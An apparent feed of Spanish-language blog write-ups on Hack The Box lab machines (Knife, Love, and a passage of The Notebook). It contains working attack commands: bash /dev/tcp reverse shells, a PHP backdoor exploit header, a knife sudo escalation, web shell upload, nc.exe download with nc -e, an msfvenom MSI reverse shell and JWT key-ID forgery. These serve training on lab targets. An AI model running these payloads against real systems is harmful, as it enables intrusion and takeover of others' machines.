&lt;h2 id=&quot;conseguir-una-reverse-shell&quot;&gt;Conseguir una Reverse Shell&lt;/h2&gt;

&lt;p&gt;Ahora solo habría que ejecutar la Reverse Shell de siempre, si no la sabes es:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'bash -i &amp;gt;&amp;amp; /dev/tcp/tuip/puertoEnElQueTienesNC 0&amp;gt;&amp;amp;1'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Y la petición quedaría así:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; GET / HTTP/1.1
Host: 10.10.10.242
User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;X11&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Linux x86_64&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; rv:92.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Gecko/20100101 Firefox/92.0
User-Agentt: zerodiumsystem&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.49/443 0&amp;gt;&amp;amp;1'&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
Accept: text/html,application/xhtml+xml,application/xml&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.9,image/avif,image/webp,&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.8
Accept-Language: en-US,en&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.5
Accept-Encoding: &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt;, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Yyyyyy estamos dentrooooooo :D&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/131221770-5691e50a-7486-48ef-819f-9549fd457f4e.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;privesc&quot;&gt;Flag y Privesc&lt;/h1&gt;

&lt;p&gt;Ahora mismo, si por cualquier cosa hiciera Ctrl+C tendría que volver a enviarme la shell, cosa que nadie quiere, así que tendremos que hacer &lt;a href=&quot;https://www.thehackersnow.com/tratamiento-de-una-tty/&quot;&gt;tratamiento de la TTY&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Vale, ahora que tenemos una consola interactiva en el sistema, podríamos ir a ver la User Flag, ubicada en /home/james/user.txt:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;james@knife:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt | &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 15&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo
&lt;/span&gt;cf42b739b6d4f75
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahora que tenemos taambién la flag, habría que centrarse en la escalada de privilegios, si hacemos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; para ver si podemos ejecutar algún comando o binario como otro usuario, obtenemos:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;james@knife:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;james on knife:
    env_reset, mail_badpass,
    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin

User james may run the following commands on knife:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/knife
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Entonces podemos ejecutar &lt;strong&gt;knife&lt;/strong&gt; como root, si buscamos en &lt;a href=&quot;gtfobins.github.io&quot;&gt;gtfobins&lt;/a&gt; sobre este binario, vemos que es capaz de correr código Ruby, y que se puede usar para escalar privilegios.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Sudo&lt;/p&gt;

  &lt;p&gt;If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain &amp;gt;privileged access.&lt;/p&gt;

  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo knife exec -E 'exec &quot;/bin/sh&quot;'&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Así que ejecutamos ese comando y…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/131222071-b59c07d1-a759-4382-9576-569e603afcfe.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Yasta, somos root y podríamos irnos a /root a recoger nuestro premio por conseguir el root(valga la redundancia).&lt;/p&gt;

&lt;p&gt;Ha sido una máquina en la que no ha habido que enumerar mucho, lo cual la hace más rápida. Me ha gustado como hay que ganar acceso a la máquina y la historia detrás del bug de PHP. Si te ha gustado puedes darme una estrellita al blog :)&lt;/p&gt;

&lt;p&gt;Y recuerda, Metasploit siempre es la solución.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Love</title>
   <link href="http://0.0.0.0:80http://0.0.0.0:80/2021/08/07/love"/>
   <updated>2021-08-07T00:00:00+00:00</updated>
   <id>http://0.0.0.0:80/2021/08/07/love</id>
   <content type="html">&lt;p&gt;Love es una máquina Windows de nivel fácil en la que tendremos que explotar un SSRF para conseguir credenciales para iniciar sesión como administrador, subir una shell en PHP
e instalar un binario para ser NT AUTHORITY\SYSTEM.&lt;/p&gt;

&lt;p&gt;Como siempre, empezamos escaneando puertos para saber por donde ir para atacar:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.91 scan initiated Fri Aug  6 11:59:13 2021 as: nmap -p- --open -sS --min-rate 5000 -n -v -Pn -oG ports -oN ports.nmap 10.10.10.239
Nmap scan report for 10.10.10.239
Host is up (0.16s latency).
Not shown: 54285 closed ports, 11231 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
5000/tcp  open  upnp
5040/tcp  open  unknown
5985/tcp  open  wsman
5986/tcp  open  wsmans
7680/tcp  open  pando-pub
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Aug  6 12:00:05 2021 -- 1 IP address (1 host up) scanned in 52.20 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;table&gt;
    &lt;tr&gt;
        &lt;td&gt;Puerto&lt;/td&gt;
        &lt;td&gt;    Servicio&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;80&lt;/td&gt;
        &lt;td&gt;HTTP - aloja una página web  &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;135&lt;/td&gt;
        &lt;td&gt;msrpc - nos podríamos conectar con rpcclient para enumerar usuarios&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;443&lt;/td&gt;
        &lt;td&gt;HTTPS - como HTTP pero más seguro&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;445&lt;/td&gt;
        &lt;td&gt;SMB - para acceder a recursos compartidos del sistema con smbclient&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;3306&lt;/td&gt;
        &lt;td&gt;MySQL - una base de datos en la que pueden haber contraseñas &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;47001&lt;/td&gt;
        &lt;td&gt;WinRM - sirve para administrar el sistema de forma remota, nos podríamos conectar con evil-winRM con credenciales válidas&lt;/td&gt;
    &lt;/tr&gt;
&lt;/table&gt;

&lt;p&gt;He decidido no poner el resto de puertos ya que no vamos a hacer nada con ellos ni he encontrado una explicación que me guste, y no me gusta extenderme de más.&lt;/p&gt;

&lt;p&gt;Tras ver qué puertos están abiertos hacemos un escaneo exhaustivo de estos con -sC y -sV para ver la versión y servicio que corren y usar unos scripts básicos de enumeración:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.91 scan initiated Fri Aug  6 12:01:14 2021 as: nmap -sC -sV -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,
49667,49668,49669,49670 -oN targeted 10.10.10.239
Nmap scan report for 10.10.10.239
Host is up (0.36s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
| fingerprint-strings: 
|   LDAPBindReq, LPDString, TLSSessionReq, afp: 
|_    Host '10.10.14.137' is not allowed to connect to this MariaDB server
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
|_ssl-date: 2021-08-06T16:25:59+00:00; +21m35s from scanner time.
| tls-alpn: 
|_  http/1.1
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=8/6%Time=610D5CDC%P=x86_64-pc-linux-gnu%r(TLS
SF:SessionReq,4B,&quot;G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.137'\x20is\x20not
SF:\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(LPD
SF:String,4B,&quot;G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.137'\x20is\x20not\x20
SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(LDAPBin
SF:dReq,4B,&quot;G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.137'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(afp,4B,&quot;G
SF:\0\0\x01\xffj\x04Host\x20'10\.10\.14\.137'\x20is\x20not\x20allowed\x20t
SF:o\x20connect\x20to\x20this\x20MariaDB\x20server&quot;);
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h06m36s, deviation: 3h30m03s, median: 21m34s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-08-06T09:25:41-07:00
| smb-security-mode: 
|   account_used: &amp;lt;blank&amp;gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-06T16:25:48
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug  6 12:04:27 2021 -- 1 IP address (1 host up) scanned in 192.89 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Haciendo un escaneo de la versión y el servicio que corre cada uno de estos puertos nos encontramos un subdominio y 3 puertos que corren una página web, a ver qué será eso. Agregamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;love.htb&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;staging.love.htb&lt;/code&gt; al /etc/hosts y entramos a Faaaaaairfox a ver qué es qué.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/128548460-fa9a5463-ef23-4664-973a-2fdc26ea24df.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si entramos a love.htb nos encontramos un panel de inicio de sesión con el que no vamos a hacer nada de momento, así que vamos a mirar los demás puertos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/128548619-8c838255-39d3-46b3-b294-5f68bbdf0475.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Entramos a staging.love.htb(o https://10.10.10.239) y nos encontramos esto, que tiene mejor pinta, volveremos tras ver que hay en el puerto 5000.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/128548702-59561f22-9593-410c-a901-c2e72080ea82.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;:/
Pues vamos a volver al HTTPS.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/128548855-9ecd1cac-334a-4b9a-9c21-f002e3a73736.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si le damos al apartado de demo nos lleva a esto, que nos pide una URL, pero qué pasa si le ponemos el puerto 5000, que desde fuera esta prohibido? 
No hay que escribir la IP de la máquina, si no localhost, ya que estamos pidiendo algo de la misma máquina.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/128549076-33a3b327-2a4d-41d2-b06c-48514ec1f542.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;BUENOOOOOOOOOOOO, unas credenciales. Creo que todos sabemos para qué es esto, así que volvamos a love.htb(Puerto 80), y como dice admin tiene que haber un /admin.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/128571884-33d1f0b2-bb42-4c47-a2da-ca7a0bee2ee9.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Efectivamente, estamos dentro.
Buscando por la dashboard no encontramos nada de utilidad, pero podemos cambiar la foto de perfil de nuestro usuario, y ¿qué pasaría si en vez de un .jpg le metemos una shell en PHP como esta?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/128572164-71d6556d-8e70-491a-9ef0-d8fd0bfd48ea.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pues que nos deja sin problema.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/128572281-beb15c21-fd8f-476b-9988-a99c60246a90.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Entonces vamos a /images/rce.php(el nombre de mi archivo) y con el parámetro cmd le pasamos un comando a nivel de sistema:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/128572413-ecc9ac31-9ca9-48c1-8935-ea0e893bec9d.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Yyyy ahí está :D. Verifiqué si tenía cURL y en efecto, lo tenía, así que lo aproveché para colar un nc.exe y entablarme una reverse shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/128572646-f3e83e62-b746-44f5-9bc4-826382b6174c.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;La máquina ha hecho una petición GET a mi máquina solicitando nc.exe, y con -o lo he guardado a nc.exe, ahora solo falta ejecutarlo y enviarme una shell. Usando el nc 
que pasé antes me he enviado un cmd.exe con el parámetro -e a mi IP por el puerto 6969(nice.)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/128572897-f219c461-8633-4b3c-83fd-ea2f55e82ff1.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bueno, somos phoebe, si vemos qué privilegios tenemos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoami /priv&lt;/code&gt; tenemos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/128575730-5b80b53e-6180-46f6-94e3-f441a7795782.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero, ¿y si vemos el registro a ver si tenemos AlwaysInstallElevated?&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Está puesto en 1, que significa True, así que podemos generar un binario malicioso que envíe una shell a mi máquina como root con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.137 LPORT=42069 -f msi -o reverse.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: reverse.msi
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahora solo faltaría crear un servidor HTTP con python, descargarlo en la máquina y escuchar con netcat.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/128576105-95b02d26-f3d1-4c3a-95d6-77064eff3e96.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahí recibimos la petición GET, ahora hay que ejecutarlo escribiendo el nombre del archivo y escuchar con nc por el puerto que hayas introducido en LPORT al crear el 
payload.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/128576255-2cae797b-fb8b-4498-9e8c-dc5e1a843907.png&quot; alt=&quot;imagen&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahí estáaaaaa, ahora hay que dirigirse a C:\Users\Administrator\Desktop y leer root.txt con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;type root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Ha sido una máquina bastante divertida, me ha gustado bastante la parte del user, pero no tanto la privesc. Hasta aquí la máquina, el siguiente sábado haré otro writeup(si soy capaz de hacer la máquina :p)&lt;/p&gt;

&lt;p&gt;Y recuerda, aguante Metasploit ;)&lt;/p&gt;

</content>
 </entry>
 
 <entry>
   <title>The Notebook</title>
   <link href="http://0.0.0.0:80http://0.0.0.0:80/2021/07/31/the-notebook"/>
   <updated>2021-07-31T00:00:00+00:00</updated>
   <id>http://0.0.0.0:80/2021/07/31/the-notebook</id>
   <content type="html">&lt;p&gt;Bueno, este es el primer post, voy a intentar no dejar morir la página.&lt;/p&gt;

&lt;p&gt;TheNotebook es una Máquina Linux de nivel medio en la que tendremos que cambiar nuestra cookie de sesión a la del todopoderoso admin para conseguir una shell como www-data, robarle la ID a Noah y escapar del contenedor para convertirnos en root.&lt;/p&gt;

&lt;p&gt;Como siempre, comenzamos escaneando los puertos de la máquina para saber a qué nos enfrentamos. Yo suelo hacer directamente un escaneo de la versión y servicio de los puertos abiertos.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; nmap -p- --open --min-rate 3000 -sS -sC -sV 10.10.10.230 -oN targeted
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nmap 7.91 scan initiated Sat Jul 17 13:53:17 2021 as: nmap -p- --open --min-rate 3000 -sS -sC -sV 10.10.10.230 -oN targeted
Nmap scan report for 10.10.10.230
Host is up (0.047s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Sat Jul 17 13:53:27 2021 -- 1 IP address (1 host up) scanned in 9.49 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bueno, puertos 22(SSH, nada por ahí) y 80(HTTP)&lt;/p&gt;

&lt;p&gt;En el HTTP encontramos una página web con un panel de inicio de sesión y registro. 
&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/127770899-030fac83-8883-4f42-8e80-7f723f3a5dc1.png&quot; alt=&quot;web&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Fuzzearla no hace nada :/, así que nos registramos y creamos una nueva nota, pero antes abriendo burpsuite para ver como viajan los datos, y descubrimos una cookie de sesión, en concreto una JWT(Json Web Token)&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/127771086-62b6d643-4f76-4fc6-b27d-213679667cad.jpg&quot; alt=&quot;Cookie de usuario&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Buscando más sobre esto nos encontramos una página en la que podemos encriptar y desencriptar estas cookies, si desencripto la mía aparece: &lt;img src=&quot;https://user-images.githubusercontent.com/71317374/127771204-cbe65c3e-e81a-441c-a420-59c03db8e181.jpg&quot; alt=&quot;PrtScr capture_2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Veo 2 cosas interesantes: el parámetro ‘kid’ y ‘admin_cap’. El parámetro kid(Key ID), que indica qué clave se ha usado para asegurar ese JWT, busca una clave privada en su puerto 7070, pero podríamos cambiarlo a mi IP de atacante para que verifique el token con mi clave privada. Para generar una clave JWT RS256 (que es el algoritmo que usa esta página web) hay que hacerlo con ssh-keygen&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key

Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in privKey.key
Your public key has been saved in privKey.key.pub
The key fingerprint is:
SHA256:0TXya6jN+ppi3B2PetAK53kFWu70pb5w74Yr+5WQAC8 root@kali
The key's randomart image is:
+---[RSA 4096]----+
|        . . o    |
|         + + .   |
|        E + .    |
|         ooo o   |
|        S=..=    |
|      . ++=..... |
|     . =.B+*.+o  |
|      + =oBo=o.  |
|     . .=*o===o  |
+----[SHA256]-----+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Ahora que tengo la clave, la idea sería copiarla al portapapeles para crear mi JWT con permisos de admin y además compartir un servidor HTTP con python para que compruebe que la clave existe.
&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/127781126-6f3aaf2b-f8ee-4413-8626-b81597469d15.png&quot; alt=&quot;Generando el JWT&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Metemos la clave en Storage y… tenemos acceso al panel de administrador!!!
&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/127781194-9169d3d4-ba62-408f-abe7-7747958c52e3.png&quot; alt=&quot;permisos de admin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si vamos al Admin Panel tenemos 2 apartados, uno para ver notas y otro para subir archivos. En las notas hay 2 muy interesantes: 
&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/127781227-14318fa7-54ae-4cf7-ac83-901ba2973f03.png&quot; alt=&quot;Nota 1&quot; /&gt;
&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/127781240-ff0496a6-9150-4202-ac2c-f683cee0fe3e.png&quot; alt=&quot;Nota 2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Buenooooo, podemos subir archivos PHP con una reverse shell o una backdoor, y además hay backups de algo, lo que es interesante. 
Vamos a subir una shell en PHP para ejecutar comandos, por qué no?
&lt;img src=&quot;https://user-images.githubusercontent.com/71317374/127781288-7c1232ac-07c9-4a57-81a4-27335ba31b12.png&quot; alt=&quot;subida de archivo PHP&quot; /&gt;
